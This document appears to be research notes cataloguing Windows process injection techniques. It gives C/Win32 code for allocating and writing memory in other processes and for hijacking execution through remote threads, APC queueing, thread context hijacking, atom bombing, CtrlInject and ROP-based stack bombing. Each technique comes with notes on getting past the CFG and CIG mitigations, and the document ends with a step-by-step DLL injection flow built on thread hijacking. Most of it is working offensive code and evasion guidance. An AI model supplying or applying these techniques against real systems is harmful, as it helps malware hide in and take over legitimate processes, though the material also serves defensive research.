# Process injection techniques

## Memory allocation technique
```
HANDLE h = OpenProcess(PROCESS_VM_OPERATION, FALSE, process_id);
LPVOID target_payload=VirtualAllocEx(h,NULL,sizeof(payload),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

• Can allocate executable pages
• For executable pages, Windows automatically sets all the region to
be CFG-valid
• Variant – allocating RW pages, then adding X with VirtualProtectEx

## WriteProcessMemory - Memory writing technique
```
HANDLE h = OpenProcess(PROCESS_VM_WRITE, FALSE, process_id);
WriteProcessMemory(h, target_payload, payload, sizeof(payload),NULL);
```
• No prerequisites, no limitations. Address is controlled.
• CFG – if the allocation set execution privileges (e.g. VirtualAllocEx), then all the
region is CFG-valid.
• CIG – no impact.

## CreateRemoteThread execution technique
```
HANDLE h = OpenProcess(PROCESS_CREATE_THREAD, FALSE,process_id);
CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE) target_execution, RCX, 0, NULL);
```
• Pre-requisites – none.
• CIG – no impact
• CFG – target_execution should be valid CFG target.
• Registers – control over RCX

## DLL injection execution technique
```
HANDLE h = OpenProcess(PROCESS_CREATE_THREAD, FALSE, process_id);
CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA,target_DLL_path, 0, NULL);
```

• Pre-requisites – the DLL is on disk; write-technique used to write the DLL path to
the target process; DllMain is restricted (loader lock).
• CFG – no impact
• CIG – blocks this technique
• Variant: using QueueUserAPC/NtQueueApcThread

Another one:
```
HMODULE h = LoadLibraryA(dll_path);
HOOKPROC f = (HOOKPROC)GetProcAddress(h, "GetMsgProc"); // GetMessage hook
SetWindowsHookExA(WH_GETMESSAGE, f, h, thread_id);
PostThreadMessage(thread_id, WM_NULL, NULL, NULL); // trigger the hook
```
Pre-requisites – the DLL is on disk, exports e.g. GetMsgProc
• CFG – no impact
• CIG – blocks this technique

## APC execution technique
HANDLE h = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
QueueUserAPC((LPTHREAD_START_ROUTINE)target_execution, h, RCX);
or
NtQueueApcThread(h, (LPTHREAD_START_ROUTINE)target_execution, RCX,
RDX, R8D);

• Pre-requisites – thread must be in alertable state (next slide)
• CIG – no impact
• CFG – target_execution should be valid CFG target.
• Registers – control over RCX (NtQueueApcThread – RCX, RDX, R8D)

Alertable state functions
The following 5 functions (and their low-level syscall wrappers):
• SleepEx
• NtDelayExecution
• WaitForSingleObjectEx
• NtWaitForSingleObject
• WaitForMultipleObjectsEx
• NtWaitForMultipleObjects
• SignalObjectAndWait
• NtSignalAndWaitForSingleObject
• MsgWaitForMultipleObjectsEx (probably RealMsgWaitForMultipleObjectsEx)
• NtUserMsgWaitForMultipleObjectsEx
Quite common!
Easily detected – RIP at internal function +0x14 (right after SYSCALL)


## Thread hijacking execution technique (SIR)
HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
SuspendThread(t);
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;
ctx.Rip = (DWORD64)target_execution;
SetThreadContext(t, &ctx);
ResumeThread(t);

Pre-requisites: none.
• CFG – no impact (!) except RSP
• Control over registers: no guaranteed control over volatile registers (RAX, RCX,
RDX, R8-R11). Control over RSP is limited (stack reservation limits).
• With RW memory (no X):
• Use write primitive to write ROP chain to the target process
• Set RIP to a stack pivot gadget to set RSP to the controlled memory

## Shared memory writing technique
HANDLE hm = OpenFileMapping(FILE_MAP_ALL_ACCESS,FALSE,section_name);
BYTE* buf = (BYTE*)MapViewOfFile(hm, FILE_MAP_ALL_ACCESS, 0, 0, section_size);
memcpy(buf+section_size-sizeof(payload), payload, sizeof(payload));
HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_id);
char* read_buf = new char[sizeof(payload)];
SIZE_T region_size;
for (DWORD64 address = 0; address < 0x00007fffffff0000ull; address += region_size)
{
  MEMORY_BASIC_INFORMATION mem;
  SIZE_T buffer_size = VirtualQueryEx(h, (LPCVOID)address, &mem, sizeof(mem));
  … Shared memory detection logic here …
  region_size = mem.RegionSize;
}

## Shared memory detection logic
if ((mem.Type == MEM_MAPPED) && (mem.State == MEM_COMMIT) && (mem.Protect == PAGE_READWRITE) && (mem.RegionSize == section_size))
{
  ReadProcessMemory(h, (LPCVOID)(address+section_size-sizeof(payload)), read_buf,sizeof(payload), NULL);
  if (memcmp(read_buf, payload, sizeof(payload)) == 0)
  {
    // the payload is at address + section_size - sizeof(payload);
    …
    break;
  }
}

Pre-requisites: target process has RW shared memory, attacker knows the name
and size
• CFG – (shared) memory retains its access rights (typically not executable)
• CIG – no impact

## Atom bombing write technique
Naïve code (payload length<256, with terminating NUL byte and no other NULs):
HANDLE th = OpenThread(THREAD_SET_CONTEXT|
THREAD_QUERY_INFORMATION, FALSE, thread_id);
ATOM a = GlobalAddAtomA(payload);
NtQueueApcThread(th, GlobalGetAtomNameA,(PVOID)a,(PVOID)(target_payload), (PVOID)(sizeof(payload)));

• Original paper doesn’t write NUL bytes (assumes zeroed out target memory) –
we devised a technique to write NUL bytes
• Pre-requisites: thread must be in alertable state. target_payload is allocated,
writable.
• CFG/CIG – no impact. target_payload retains its access rights (typically not
executable)

## NtMapViewOfSection (allocating+) writing technique
HANDLE fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL,PAGE_EXECUTE_READWRITE, 0, sizeof(payload), NULL);
LPVOID map_addr =MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0);
HANDLE p = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION,FALSE, process_id);
memcpy(map_addr, payload, sizeof(payload));
LPVOID target_payload=0;
SIZE_T view_size=0;
NtMapViewOfSection(fm, p, &target_payload, 0, sizeof(payload),NULL, &view_size, ViewUnmap, 0, PAGE_EXECUTE_READWRITE );

Cannot be used for already allocated memory. If target_payload is 0, Windows
chooses the address; if target_payload>0, Windows will map to there (but it has
to be an un-allocated memory).
• Pre-requisites: none. Limitations: cannot write to allocated memory.
• CFG – memory allocated with page execution privileges becomes valid CFG
target!
• CIG – not relevant

## Unmap+rerwrite execution technique
MODULEINFO ntdll_info;
HMODULE ntdll = GetModuleHandleA("ntdll");
GetModuleInformation(GetCurrentProcess(), ntdll, &ntdll_info, sizeof(ntdll_info));
LPVOID ntdll_copy = malloc(ntdll_info.SizeOfImage);
HANDLE p = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION |PROCESS_SUSPEND_RESUME, FALSE, process_id);
NtSuspendProcess(p);
ReadProcessMemory(p, ntdll, ntdll_copy, ntdll_info.SizeOfImage, NULL);
… // Patch e.g. NtClose in ntdll_copy
NtUnmapViewOfSection(p, ntdll);
… // Allocate +(Re)write ntdll_copy to address ntdll in target process
FlushInstructionCache(p, ntdll, ntdll_info.SizeOfImage);
NtResumeProcess(p);

• Pre-requisite: Write technique must be able to allocate (at least) RX pages in a
specific address
• CFG – all the original CFG-valid addresses in NTDLL should be CFG-valid (or else
process may crash). However, both VirtualAllocEx and NtMapViewOfSection set
whole section to CFG-valid when PAGE_EXECUTE is requested.
• CIG – not relevant
• Control over registers: no
• Note that in order not to destabilize the process:
  • Process-wide suspend
  • Copying the complete NTDLL memory (incl. static variables)

## Callback override execution techniques
• SetWindowLongPtr (SetWindowLong)
• PROPagate
• Kernel Callback Table
• Ctrl-Inject
• Service Control
• USERDATA
• ALPC callback
• CLIBRDWNDCLASS
• DnsQuery
• WNF callback
• Shatter-like:
• WordWarping
• Hyphentension
• AutoCourgette
• Streamception
• Oleum
• ListPLanting
• Treepoline

Concept:
Write code to the target process using a writing technique
• Find/obtain a memory address of an object (with vtbl)/callback function
• May be tricky – need to know that the process has the object/callback (e.g. ALPC,
console apps, private clipboard)
• Via API (e.g. GetWindowLongPtr)
• Via memory search (e.g. ALPC)
• Replace the object/callback (using a writing technique or standard API) to point
at a chosen function/code
• Must be CFG-valid target
• May require some object/code adjustments
• Trigger execution
• May be tricky (e.g. DnsQuery)
• (Restore original object/callback)

## CtrlInject execution technique
HANDLE h = OpenProcess(PROCESS_VM_OPERATION, FALSE, process_id); // PROCESS_VM_OPERATION is required for RtlEncodeRemotePointer
void* encoded_addr = NULL;
ntdll!RtlEncodeRemotePointer(h, target_execution, &encoded_addr);
… // Use any Memory Write technique here to copy encoded_addr to kernelbase!SingleHandler in the target process
INPUT ip;
ip.type = INPUT_KEYBOARD;
ip.ki.wScan = 0;
ip.ki.time = 0;
ip.ki.dwExtraInfo = 0;
ip.ki.wVk = VK_CONTROL;
ip.ki.dwFlags = 0; // 0 for key press
SendInput(1, &ip, sizeof(INPUT));
Sleep(100);
PostMessageA(hWindow, WM_KEYDOWN, 'C', 0); // hWindow is a handle to the application window

## memset/memmove write technique
HMODULE ntdll = GetModuleHandleA("ntdll");
HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
for (int i = 0; i < sizeof(payload); i++)
{
  NtQueueApcThread(t, GetProcAddress(ntdll,"memset"),(void*)(target_payload+i), (void*)*(((BYTE*)payload)+i), 1);
}
// Can finish with an “atomic” NtQueueApcThread(t,
GetProcAddress(ntdll, "memmove"), (void*)target_payload_final,
(void*)target_payload, sizeof(payload));

Prerequisites: thread must be in an alertable state, memory is allocated.
• CFG: not affected (ntdll!memset is CFG-valid), memory retains its original
access rights (typically RW)
• CIG: not affected.
• Writes to any address

## Stack-bombing execution technique
Naïve code (run and crash):
HANDLE t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT |
THREAD_SUSPEND_RESUME, FALSE, thread_id);
SuspendThread(t);
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_ALL;
GetThreadContext(t, &ctx);
DWORD64 ROP_chain = (DWORD64)ctx.Rsp; // for the 5 alertable state functions…
… // Adjust ROP_chain based on ctx.rip (or use APC…)
… // write ROP chain to ROP_chain memory address in target process
ResumeThread(t); // when the current function returns, it’ll execute the ROP chain

Alertable state internal functions
mov r10,rcx
mov eax,SERVICE_DESCRIPTOR
test byte ptr [SharedUserData+0x308],1
jne +3
syscall
ret
int 2E
ret
• No use of stack (tos=rsp=ptr to return address)
• No use of volatile registers after return from kernel – injected code can use them

Prerequisites: thread in alertable state (APC), or careful analysis of interrupted
function; target (e.g. ROP gadget) should be RX.
• CFG – no impact(!). Can use ROP chain.
• CIG – no impact.
• Control over registers: not volatile ones.
Paper+Pinjectra has fully functional code (based on APC+memset)


Injecting DLL into running processes using thread hijacking. No remote thread is created, only existing thread is used for injection.

The injector injects shellcode into the target process, and then a running thread in the target process is hijacked to execute the injected code. The injected code calls the LoadLibrary function to load the DLL.

Flow of injection

1) Parse the DLL name and the target process ID from command line.

2) Allocate buffer for the shellcode and DLL name.

3) Copy the shellcode to the buffer.

4) Copy the DLL name to the end of shellcode.

5) Open the target process handle.

6) Allocate memory in the target process.

7) Find a running thread to hijack.

8) Get the context of the target thread.

9) Write the eip register to the shellcode.

10) Write the address of LoadLibrary to the shellcode.

11) Write the shellcode and DLL name to the target process.

12) Hijack a running thread in the target process to execute the shellcode.

13) The hijacked thread executes the shellcode. The shellcode calls the LoadLibrary function to load the DLL.

14) The shellcode returns, and the thread continue to execute its own code.
